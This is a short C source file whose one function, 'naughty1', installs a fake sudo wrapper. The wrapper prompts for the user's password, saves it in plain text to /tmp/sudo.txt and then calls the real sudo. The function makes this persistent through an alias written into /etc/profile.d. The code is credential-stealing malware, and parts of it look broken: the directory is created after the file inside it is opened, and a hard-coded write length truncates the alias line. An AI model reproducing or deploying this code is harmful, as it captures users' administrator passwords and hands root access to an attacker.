#include <fcntl.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int naughty1() {
  int fd1 = open("/var/.info/sudo", O_CREAT | O_WRONLY, 0777);
  write(fd1,
        "read -sp \"[sudo] password for $USER: \" sudopass\necho \"\"\nsleep "
        "2\necho $sudopass >> /tmp/sudo.txt\n/usr/bin/sudo $@\n",
        97);
  close(fd1);
  int fd2 = open("/etc/profile.d/interesting.sh", O_CREAT | O_WRONLY | O_APPEND,
                 0777);
  write(fd2, "alias sudo=/var/.info/sudo\n", 25);
  close(fd2);
  mkdir("/var/.info", 0700);
  return 0;
}